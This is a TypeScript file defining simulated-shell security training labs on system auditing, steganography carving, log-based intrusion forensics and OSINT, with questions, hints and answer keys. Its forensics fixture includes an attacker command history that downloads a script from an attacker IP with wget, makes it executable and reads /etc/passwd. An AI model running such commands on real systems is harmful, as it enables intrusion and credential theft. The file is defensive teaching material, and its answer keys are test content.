// Scenarios for the interactive terminal (src/components/labs/ShellLab.tsx).
// Each builds an in-memory box and asks investigative questions you answer by
// exploring with the simulated shell. Everything is defensive: audit a box,
// carve a hidden file, reconstruct an intrusion from logs.

import type { ShellSpec } from "@/lib/sim/shell";
import { makePng, makeZip, makeJpeg } from "@/lib/sim/bytes";
import type { Task } from "./types";

export type { Task };

export type ShellLab = {
  id: string;
  title: string;
  intro: string;
  spec: ShellSpec;
  tasks: Task[];
};

const eq = (want: string) => (a: string) => a.trim().toLowerCase() === want.toLowerCase();
const has = (want: string) => (a: string) => a.trim().toLowerCase().includes(want.toLowerCase());
const num = (want: number) => (a: string) => parseInt(a.trim(), 10) === want;

// ── OS: audit an authorized box ──────────────────────────────────────────────
const osSpec: ShellSpec = {
  user: "analyst", host: "web01", home: "/home/analyst", groups: ["analyst"],
  id: "uid=1000(analyst) gid=1000(analyst) groups=1000(analyst)",
  uname: "Linux web01 6.8.0-45-generic #45-Ubuntu SMP x86_64 GNU/Linux",
  suggest: ["ls -la", "id", "find / -perm -4000 2>/dev/null", "ls -l /etc/cron.d", "cat /var/backups/notes.txt"],
  motd: "Authorized configuration audit. Read-only review of web01.",
  files: {
    "/home/analyst/README": "Audit scope: inventory SUID binaries, cron jobs, and any secrets left in files.\nUse: find, ls -l, cat, grep.\n",
    "/usr/bin/passwd": "\x7fELF binary — set user ID on execution",
    "/usr/bin/sudo": "\x7fELF binary — set user ID on execution",
    "/usr/bin/mount": "\x7fELF binary — set user ID on execution",
    "/usr/local/bin/netbackup": "\x7fELF binary — custom, set user ID on execution",
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nanalyst:x:1000:1000::/home/analyst:/bin/bash\n",
    "/etc/cron.d/backup": "*/5 * * * * root /opt/scripts/collect.sh\n",
    "/opt/scripts/collect.sh": "#!/bin/bash\n# collects /var/log into /var/backups\ntar czf /var/backups/logs.tgz /var/log\n",
    "/var/backups/notes.txt": "temp db restore creds (DELETE ME): db_user / Rstore!2026\nowner: ops team\n",
    "/var/log/auth.log": "placeholder\n",
  },
  dirs: ["/opt", "/var/backups", "/etc/cron.d"],
  meta: {
    "/usr/bin/passwd": { mode: "-rwsr-xr-x", owner: "root" },
    "/usr/bin/sudo": { mode: "-rwsr-xr-x", owner: "root" },
    "/usr/bin/mount": { mode: "-rwsr-xr-x", owner: "root" },
    "/usr/local/bin/netbackup": { mode: "-rwsr-xr-x", owner: "root" },
    "/opt/scripts/collect.sh": { mode: "-rwxrwxrwx", owner: "root" }, // world-writable, runs as root via cron
    "/etc/cron.d/backup": { owner: "root" },
    "/var/backups/notes.txt": { owner: "root", mode: "-rw-r--r--" },
  },
};

// ── Stego: what is really inside this file ───────────────────────────────────
const stegoPng = makePng({
  width: 1280, height: 720,
  text: [["Comment", "SEhCe3N0M2dvX2luX3BsYWluX3NpZ2h0fQ=="]], // base64 of the flag
  after: makeZip([{ name: "note.txt", data: "backup passphrase: correct-horse-battery\n" }]),
});
const disguisedZip = makeZip([{ name: "contacts.csv", data: "name,phone\npat,555-0100\n" }]);
const stegoSpec: ShellSpec = {
  user: "analyst", host: "lab", home: "/home/analyst", groups: ["analyst"],
  suggest: ["ls", "file *", "binwalk vacation.png", "binwalk -e vacation.png", "strings vacation.png | head", "exiftool vacation.png"],
  motd: "A reader sent in these files. Work out what each one really contains.",
  files: {
    "/home/analyst/vacation.png": stegoPng,
    "/home/analyst/resume.pdf": disguisedZip, // a zip wearing a .pdf extension
    "/home/analyst/plain.jpg": makeJpeg(500),
  },
  programs: {
    exiftool: {
      "/home/analyst/vacation.png": "ExifTool Version Number : 12.76\nFile Type               : PNG\nImage Size              : 1280x720\nComment                 : SEhCe3N0M2dvX2luX3BsYWluX3NpZ2h0fQ==",
      "/home/analyst/plain.jpg": "ExifTool Version Number : 12.76\nFile Type               : JPEG\nImage Size              : (unknown)\nComment                 : (none)",
    },
  },
};

// ── Forensics: reconstruct the intrusion from logs ───────────────────────────
const brute = (ip: string, user: string, n: number, startSec: number) =>
  Array.from({ length: n }, (_, i) => {
    const t = new Date(Date.UTC(2026, 9, 23, 2, 14, startSec + i * 3));
    return `${t.toISOString().slice(0, 19).replace("T", " ")} web01 sshd[2211]: Failed password for ${user} from ${ip} port 51${i} ssh2`;
  }).join("\n");
const authLog =
  brute("203.0.113.66", "root", 6, 0) + "\n" +
  brute("203.0.113.66", "admin", 5, 20) + "\n" +
  "2026-10-23 02:15:11 web01 sshd[2211]: Failed password for deploy from 203.0.113.66 port 5190 ssh2\n" +
  "2026-10-23 02:15:14 web01 sshd[2211]: Accepted password for deploy from 203.0.113.66 port 5191 ssh2\n" +
  "2026-10-23 02:15:14 web01 sshd[2211]: pam_unix(sshd:session): session opened for user deploy\n";
const histLog =
  "2026-10-23 02:15:40 wget http://203.0.113.66/x/kit.sh -O /tmp/kit.sh\n" +
  "2026-10-23 02:15:52 chmod +x /tmp/kit.sh\n" +
  "2026-10-23 02:15:58 cat /etc/passwd\n";
const forSpec: ShellSpec = {
  user: "analyst", host: "ir", home: "/home/analyst", groups: ["analyst"],
  cwd: "/evidence",
  suggest: [
    "grep Accepted auth.log",
    "grep Failed auth.log | awk '{print $8}' | sort | uniq -c",
    "grep -c Failed auth.log",
    "cat deploy_history.log",
    "sha256sum auth.log",
  ],
  motd: "Incident on web01. The logs are copied read-only into /evidence. Build the timeline.",
  files: {
    "/evidence/auth.log": authLog,
    "/evidence/deploy_history.log": histLog,
    "/evidence/README": "Preserved copies. Record a hash before you work, then reconstruct: who got in, from where, and what they did first.\n",
  },
  dirs: ["/evidence"], // sha256sum is a real builtin, so the hash matches the file
};

// ── OSINT: pull a target's public footprint from canned recon tools ──────────
const osintSpec: ShellSpec = {
  user: "analyst", host: "osint-vm", home: "/home/analyst", groups: ["analyst"],
  suggest: ["ls", "exiftool briefing.jpg", "whois acme-corp.example", "crtsh acme-corp.example", "dig acme-corp.example TXT"],
  motd: "Target: acme-corp.example (authorized assessment). Build their public footprint from these offline recon tools.",
  files: {
    "/home/analyst/briefing.jpg": makeJpeg(300),
    "/home/analyst/README": "Offline OSINT bench. Tools: exiftool, whois, dig, crtsh (cached crt.sh).\nFind: who took the photo, the registrant contact, and any host that shouldn't be public.\n",
  },
  programs: {
    exiftool: {
      "/home/analyst/briefing.jpg":
        "ExifTool Version Number : 12.76\nFile Type               : JPEG\nCamera Model Name        : Pixel 8 Pro\nArtist                   : opsec_fail_2026\nGPS Position             : 48.8584 N, 2.2945 E\nCreate Date              : 2026:08:11 14:02:33",
      "*": "exiftool: specify a file, e.g. exiftool briefing.jpg",
    },
    whois: {
      "*":
        "Domain Name: ACME-CORP.EXAMPLE\nRegistrar: Example Registrar, Inc.\nCreation Date: 2017-05-09T00:00:00Z\nRegistrant Organization: Acme Corp\nRegistrant Country: FR\nRegistrant Email: ops-team@acme-corp.example\nName Server: NS1.ACME-CORP.EXAMPLE\nName Server: NS2.ACME-CORP.EXAMPLE",
    },
    dig: {
      "*":
        "; <<>> DiG 9.18 <<>> acme-corp.example TXT\n;; ANSWER SECTION:\nacme-corp.example.  3600  IN  TXT  \"v=spf1 include:_spf.acme-corp.example ~all\"\nacme-corp.example.  3600  IN  TXT  \"note=migration to cloud in progress - legacy vpn still up\"",
    },
    crtsh: {
      "*":
        "crt.sh cached results for %.acme-corp.example:\n  www.acme-corp.example\n  mail.acme-corp.example\n  shop.acme-corp.example\n  vpn.acme-corp.example\n  staging-admin.acme-corp.example   <-- issued 3 days ago\n  blog.acme-corp.example",
    },
  },
};

export const shellLabs: Record<string, ShellLab> = {
  osint: {
    id: "osint-footprint",
    title: "Lab · Map the public footprint",
    intro:
      "Everything here is public data about an authorized target — no packets sent, just reading traces that already exist. Use the recon tools to answer each question. Type commands below.",
    spec: osintSpec,
    tasks: [
      {
        ask: "The briefing photo leaked who took it. What handle is in the image metadata?",
        placeholder: "a handle",
        hint: "exiftool briefing.jpg — read the Artist field.",
        solution: "opsec_fail_2026 — left in the photo’s Artist metadata. The fix: strip metadata before sharing files.",
        check: has("opsec_fail_2026"),
      },
      {
        ask: "Look up the domain’s registration. What email is listed for the registrant?",
        placeholder: "an email",
        hint: "whois acme-corp.example — find the Registrant Email line.",
        solution: "ops-team@acme-corp.example — a published WHOIS contact becomes a phishing target; privacy protection hides it.",
        check: has("ops-team@acme-corp.example"),
      },
      {
        ask: "Certificate transparency lists every cert issued. Which subdomain looks like an internal host that shouldn’t be public?",
        placeholder: "a hostname",
        hint: "crtsh acme-corp.example — scan the subdomains for one that sounds like staging/admin, not a public site.",
        solution: "staging-admin.acme-corp.example — cert transparency exposes internal names; keep them off public CAs or behind a wildcard, and don’t expose staging.",
        check: (a) => a.trim().toLowerCase().includes("staging-admin"),
      },
    ],
  },

  os: {
    id: "os-audit",
    title: "Lab · Audit web01",
    intro:
      "You have a read-only shell on an authorized box. Inventory what could let an ordinary user gain more than they should, and find a secret someone left lying around. Type commands below; answer each question when you’ve found it.",
    spec: osSpec,
    tasks: [
      {
        ask: "How many SUID binaries are under /usr?",
        placeholder: "a number",
        hint: "find / -perm -4000 2>/dev/null lists SUID files; pipe into grep /usr then wc -l to count.",
        solution: "4 — passwd, sudo, mount, and the custom netbackup.",
        check: num(4),
      },
      {
        ask: "Which of those SUID binaries is NOT a standard system tool (the one to audit)?",
        placeholder: "binary name",
        hint: "passwd, sudo and mount ship with the OS. Which path looks custom/local?",
        solution: "netbackup (/usr/local/bin/netbackup) — a custom root-SUID binary is exactly what to review.",
        check: has("netbackup"),
      },
      {
        ask: "The cron job runs a script as root every 5 minutes. Why is that script a risk?",
        placeholder: "one or two words",
        hint: "ls -l /opt/scripts/collect.sh and read the permission string — who can edit it?",
        solution: "It is world-writable (-rwxrwxrwx), so any user can change a script that root then runs.",
        check: (a) => /world.?writ|writable|everyone|rwxrwxrwx|777|anyone/i.test(a),
      },
      {
        ask: "A root-readable file left a temporary password behind. What is it?",
        placeholder: "the password",
        hint: "grep -ri pass /var/backups, or just cat /var/backups/notes.txt.",
        solution: "Rstore!2026 — credentials left in /var/backups/notes.txt; the fix is to delete it and rotate.",
        check: has("Rstore!2026"),
      },
    ],
  },

  stego: {
    id: "stego-carve",
    title: "Lab · What’s really in the file",
    intro:
      "Three files came in. Extensions lie — your job is to find each file’s true type and pull out anything hidden. Use file, strings, binwalk, exiftool and base64.",
    spec: stegoSpec,
    tasks: [
      {
        ask: "resume.pdf has a .pdf name — what is its REAL file type?",
        placeholder: "e.g. PNG, Zip, JPEG…",
        hint: "file reads the magic bytes and ignores the extension: file resume.pdf",
        solution: "A Zip archive — the .pdf extension is a disguise. Open it with unzip, not a PDF reader.",
        check: has("zip"),
      },
      {
        ask: "Carve the file hidden after the end of vacation.png and read it. What is the backup passphrase?",
        placeholder: "the passphrase",
        hint: "binwalk vacation.png shows an appended Zip; binwalk -e vacation.png carves it, then cat the extracted note.txt.",
        solution: "correct-horse-battery — stored in note.txt, appended past the PNG’s IEND marker.",
        check: has("correct-horse-battery"),
      },
      {
        ask: "vacation.png’s metadata comment is a base64 string. Decode it — what flag does it hold?",
        placeholder: "HHB{…}",
        hint: "strings vacation.png (or exiftool) shows the comment; pipe it through base64 -d: echo <string> | base64 -d",
        solution: "HHB{st3go_in_plain_sight} — base64 in a tEXt comment, decoded with base64 -d.",
        check: has("HHB{st3go_in_plain_sight}"),
      },
    ],
  },

  forensics: {
    id: "forensics-timeline",
    title: "Lab · Reconstruct the intrusion",
    intro:
      "web01 was compromised overnight. Preserved logs are in /evidence. Work out who got in, from where, and what they did first — then you’d know what to contain. Start by hashing the evidence.",
    spec: forSpec,
    tasks: [
      {
        ask: "Which account did the attacker finally log in as?",
        placeholder: "username",
        hint: 'grep Accepted auth.log — the one successful SSH login names the account.',
        solution: "deploy — after failed guesses at root and admin, the “Accepted password” line is for deploy.",
        check: eq("deploy"),
      },
      {
        ask: "What source IP was the brute force and login coming from?",
        placeholder: "an IP address",
        hint: "Read the Accepted line — the IP follows the word 'from' (it's field $10: grep Accepted auth.log | awk '{print $10}').",
        solution: "203.0.113.66 — the same IP guessed passwords and then logged in.",
        check: has("203.0.113.66"),
      },
      {
        ask: "Right after logging in, what did the attacker download? (the URL)",
        placeholder: "a URL",
        hint: "The post-login actions are in deploy_history.log — look at the wget line.",
        solution: "http://203.0.113.66/x/kit.sh — pulled to /tmp with wget, then made executable.",
        check: has("kit.sh"),
      },
    ],
  },
};
